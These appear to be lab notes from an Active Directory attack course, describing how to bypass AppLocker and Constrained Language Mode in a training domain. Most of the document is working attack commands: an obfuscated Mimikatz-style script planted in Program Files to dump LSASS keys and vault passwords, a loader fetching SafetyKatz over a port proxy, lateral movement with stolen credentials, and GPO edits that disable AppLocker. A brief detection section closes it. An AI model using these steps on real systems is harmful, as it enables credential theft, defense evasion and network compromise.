# Attack - AppLocker Bypass & Policy Exploitation

**Date:** Friday, August 21, 2026
**Topic:** Discovering & Exploiting AppLocker Policy Gaps, Credential Vault Extraction, GPO Manipulation

---

## What is AppLocker?

**Simple explanation:**
- Application Allowlist/Blocklist for Windows
- Restricts what programs can run
- Restricts what scripts can run
- Rules based on path, hash, publisher
- Often has gaps/misconfigurations

---

## Finding AppLocker Gaps

### Step 1: Check if AppLocker Exists

**Find local admin access via PSRemoting:**

```powershell
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
```

**If Loader.exe blocked:**
```
Error: "This program is blocked by group policy"
→ AppLocker is configured
→ Continue to next step
```

---

### Step 2: Query AppLocker Registry

**Check AppLocker configuration:**

```powershell
winrs -r:dcorp-adminsrv cmd

# Query AppLocker policies
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2

# Query specific rules
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454f-a263-2515c8796a5d
```

**Look for:**
- Everyone can run scripts from `C:\Program Files`
- Everyone can run scripts from `C:\Windows`
- Microsoft signed executables allowed

---

### Step 3: Check Constrained Language Mode

**Check CLM on restricted machine:**

```powershell
Enter-PSSession dcorp-adminsrv

# Check language mode
$ExecutionContext.SessionState.LanguageMode
# Output: ConstrainedLanguage (restricted)

# View AppLocker rules
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

**What CLM means:**
- Can't use dot-sourcing (`. .\script.ps1`)
- Can't run most PowerShell features
- Can only run approved commands
- Very restrictive environment

---

## Method 1: Exploit Script Gap (Program Files)

### Step 1: Create Modified Script

**Create Invoke-TheKatEx-keys-stdX.ps1:**

```powershell
# Copy original script
Copy original: Invoke-TheKat.ps1
Rename to: Invoke-TheKatEx-keys-stdX.ps1 (where X = your ID)

# Open in PowerShell ISE
Right-click → Edit

# Add encoded command at end (instead of dot-sourcing)
# This avoids CLM restriction on dot-sourcing
```

---

### Step 2: Add Encoded Function Call

**At end of script, add:**

```powershell
$jq = "t"; $hk = "o"; $cr = "k"; $dg = "e"; $z3 = "n";
$y4 = ":"; $fq = ":"; $67 = "e"; $qj = "v"; $27 = "a";
# ... (continues for all characters)
$Pwn = $jq + $hk + $cr + ... (concatenate all)
# Result: $Pwn = "token::evasive-elevate sekurlsa::evasive-keys"

Invoke-TheKat -Command $Pwn
```

**Why encoded?**
- Avoids CLM text restrictions
- Executes function directly
- No dot-sourcing needed

---

### Step 3: Copy to Program Files

**Copy to approved location:**

```powershell
Copy-Item C:\AD\Tools\Invoke-TheKatEx-keys-stdX.ps1 `
  \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'

# Program Files is allowed by AppLocker rule
```

---

### Step 4: Execute Script

**Run from target machine:**

```powershell
cd 'C:\Program Files\'

# No dot-sourcing (CLM blocks it)
# Direct execution allowed
.\Invoke-TheKatEx-keys-stdX.ps1

# Output: NTLM hashes and keys extracted
```

---

## Method 2: Extract Vault Credentials

### Why Vault?

```
Locations with credentials:
1. LSASS memory (what we normally dump)
2. Vault/Credential Manager (stored locally)
3. Browser cache (passwords stored)
4. Application configs (hardcoded)
```

**Vault = Often overlooked credential source**

---

### Step 1: Create Vault Extraction Script

**Create Invoke-TheKatEx-vault-stdX.ps1:**

```powershell
# Copy: Invoke-TheKat.ps1
# Rename: Invoke-TheKatEx-vault-stdX.ps1

# Edit script, replace:
FROM: Invoke-TheKat -Command '"sekurlsa::ekeys"'
TO:   Invoke-TheKat -Command '"token::evasive-elevate" "vault::cred /patch"'

# vault::cred /patch = Extract vault credentials
```

---

### Step 2: Copy & Execute

**Copy to Program Files:**

```powershell
Copy-Item C:\AD\Tools\Invoke-TheKatEx-vault-stdX.ps1 `
  \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'

# Execute on target
.\Invoke-TheKatEx-vault-stdX.ps1

# Output: srvadmin : password123 (cleartext!)
```

---

## Method 3: Use Extracted Credentials

### Create Process with New Credentials

**Use srvadmin credentials found in vault:**

```powershell
# Create process as srvadmin
runas /user:dcorp\srvadmin /netonly cmd

# Now in srvadmin context
# Check what machines we can access
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local -Verbose

# Output: dcorp-mgmt (srvadmin has access!)
```

---

### Extract Credentials from New Target

**Copy tools and extract:**

```powershell
# Copy Loader.exe
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe

# Setup port forwarding (hide outbound)
winrs -r:dcorp-mgmt netsh interface portproxy add v4tov4 `
  listenport=8080 listenaddress=0.0.0.0 `
  connectport=80 connectaddress=172.16.100.x

# Extract credentials
winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe `
  -path http://127.0.0.1:8080/SafetyKatz.exe `
  "sekurlsa::evasive-keys" "exit"

# More credentials extracted!
```

---

## Method 4: Disable AppLocker via GPO

### Why This Works

**AppLocker stored in Group Policy:**
- If you have modify rights on GPO → Can disable AppLocker
- studentx has Full Control on "Applocked" GPO
- Can edit policy directly
- GPO applies automatically
- AppLocker disabled on all machines

---

### Step 1: Open Group Policy Manager

**Install GPMC if needed:**

```
Server Manager → Add Roles and Features
→ Group Policy Management (under Features)
→ Install
```

**Launch GPMC:**

```powershell
runas /user:dcorp\studentx /netonly cmd
gpmc.msc
```

---

### Step 2: Find AppLocker Policy

**Navigate in GPMC:**

```
Forest
  → Domains
    → dollarcorp.moneycorp.local
      → Applocked (Right-click)
        → Edit
```

---

### Step 3: View AppLocker Rules

**In Group Policy Editor:**

```
Expand:
Policies
  → Windows Settings
    → Security Settings
      → Application Control Policies
        → AppLocker
```

**Find restrictions:**
1. **Executable Rules** - Everyone can run Microsoft signed binaries
2. **Script Rules** - Everyone can run Microsoft signed scripts from Program Files

---

### Step 4: Delete Restriction

**Delete Executable Rules:**

```
Right-click on rule
→ Delete

This removes: "Everyone can run Microsoft signed executables"
Result: All executables now allowed
```

---

### Step 5: Force GPO Update

**Update policy on target:**

```powershell
winrs -r:dcorp-adminsrv cmd
gpupdate /force
```

---

### Step 6: Copy Tools & Execute

**Now tools work without restriction:**

```powershell
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-adminsrv\C$\Users\Public\Loader.exe

winrs -r:dcorp-adminsrv cmd

# Setup port forwarding
netsh interface portproxy add v4tov4 `
  listenport=8080 listenaddress=0.0.0.0 `
  connectport=80 connectaddress=172.16.100.x

# Now Loader.exe works (AppLocker disabled)
C:\Users\Public\Loader.exe `
  -path http://127.0.0.1:8080/SafetyKatz.exe `
  -args "sekurlsa::evasive-keys" "exit"

# All credentials extracted!
```

---

## Complete Attack Flow

```
PHASE 1: Reconnaissance ✓
├─ Find PSRemoting local admin access
├─ Try to run tool (get AppLocker error)
├─ Verify AppLocker exists
└─ Query AppLocker rules

PHASE 2: Method 1 - Script Gap ✓
├─ Create modified script (no dot-sourcing)
├─ Copy to Program Files (allowed location)
├─ Execute script directly
├─ Extract credentials from LSASS
└─ Get user hashes

PHASE 3: Method 2 - Vault Credentials ✓
├─ Modify script for vault extraction
├─ Copy to Program Files
├─ Execute script
├─ Extract cleartext vault credentials
└─ Get srvadmin password!

PHASE 4: Lateral Movement ✓
├─ Use srvadmin credentials
├─ Find additional machines
├─ Access dcorp-mgmt with srvadmin
└─ Extract more credentials

PHASE 5: Disable AppLocker ✓
├─ Open Group Policy Manager
├─ Edit AppLocker policy
├─ Delete Executable Rules
├─ Force GPO update
└─ AppLocker disabled

PHASE 6: Full Access ✓
├─ No more AppLocker restrictions
├─ Run any tool/executable
├─ Extract all credentials
└─ Complete compromise

RESULT: Complete AppLocker bypass
        Multiple credential extraction methods
        Full system access
        Multiple persistence paths
```

---

## Three Ways to Get Credentials

### 1. LSASS Memory (Method 1)

```
Invoke-TheKat → token::elevate + sekurlsa::evasive-keys
Result: NTLM hashes, AES256 keys, plaintext passwords
Risk: May need SYSTEM access
Success: High
```

---

### 2. Vault/Credential Manager (Method 2)

```
Invoke-TheKat → vault::cred /patch
Result: Plaintext stored credentials
Risk: No special access needed (user vault)
Success: Often high (credentials left in vault)
```

---

### 3. Disable AppLocker (Method 4)

```
Modify GPO → Delete rules
Result: Unrestricted tool execution
Risk: Detectable (GPO modification)
Success: Permanent (until re-enabled)
```

---

## Key Differences

### CLM (Constrained Language Mode)

```
CLM = Restricted PowerShell environment
├─ Can't use dot-sourcing
├─ Can't use most PS features
├─ Limited variable/function access
└─ Very restrictive

Bypass:
├─ Include function calls in script itself
├─ No dot-sourcing needed
├─ Direct execution of .ps1
└─ Works in CLM
```

---

### AppLocker Gaps

```
Default rules allow:
├─ Microsoft signed executables (everywhere)
├─ Microsoft signed scripts (C:\Windows, C:\Program Files)
├─ Anything from admin-approved paths
└─ Easy to exploit

Our exploit:
├─ Modified script in Program Files (allowed)
├─ Extract credentials (bypasses restrictions)
├─ Use credentials for lateral movement
└─ Or disable AppLocker completely
```

---

## Critical Steps

```
✓ Use /netonly with runas
  └─ Allows network authentication
  └─ Essential for cross-machine access

✓ Encode function calls
  └─ Avoid CLM dot-sourcing restriction
  └─ Direct function invocation

✓ Copy to Program Files
  └─ Already approved path
  └─ AppLocker won't block

✓ Extract from multiple sources
  └─ LSASS (hashes)
  └─ Vault (plaintext)
  └─ Multiple chances to get credentials

✓ Check GPO permissions
  └─ If you have Full Control
  └─ Can disable AppLocker completely
  └─ Permanent access gained
```

---

## Common Issues

### Script Takes Long Time

```
Normal: 1-2 minutes
Reason: Mimikatz memory dump
Solution: Wait, don't interrupt
```

---

### Vault Script Returns Nothing

```
Reason: No credentials stored in vault
Solution: Try LSASS extraction instead
Alternative: Check browser cache or application configs
```

---

### AppLocker Still Blocking

```
Check:
- File in correct location? (Program Files)
- GPO updated? (gpupdate /force)
- Rules really deleted?
Solution: Re-open GPMC, verify deletion
```

---

## Detection & Defense

### What to Monitor

```
Detection:
- Modified scripts in Program Files
- GPMC being opened
- GPO changes
- Mimikatz execution (even in memory)
- PSRemoting to restricted machines

Defense:
- Monitor CLM violations
- Alert on GPO modifications
- Audit vault access
- Block mimikatz signatures
- Strong AppLocker policies
- Regular audit of AppLocker gaps
```

---

## Key Takeaway

```
APPLOCKER BYPASS:
1. Find AppLocker gaps (Program Files access)
2. Create CLM-compatible scripts (no dot-sourcing)
3. Extract credentials (LSASS or Vault)
4. Use credentials for lateral movement
5. OR disable AppLocker via GPO (if you have rights)
6. Result: Complete system compromise

Why effective:
- AppLocker has default gaps
- CLM has workarounds
- Vault often has credentials
- GPO modifications hard to detect
- Multiple extraction methods

Timeline:
- 5-10 minutes: Scripts prepared
- 2-5 minutes: Script execution
- 1-2 minutes: Credentials extracted
- 5 minutes: Lateral movement
- 1 minute: AppLocker disabled (if possible)
Total: 15-25 minutes to full compromise
```

---

## References

- [AppLocker Configuration](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker)
- [Constrained Language Mode](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_language_modes)
- [Windows Credential Manager](https://docs.microsoft.com/en-us/windows/win32/secauthn/credential-manager)
- [Mimikatz Vault Extract](https://github.com/gentilkiwi/mimikatz/wiki/module-~-vault)

---

*Next: Advanced Evasion & OPSEC Techniques*
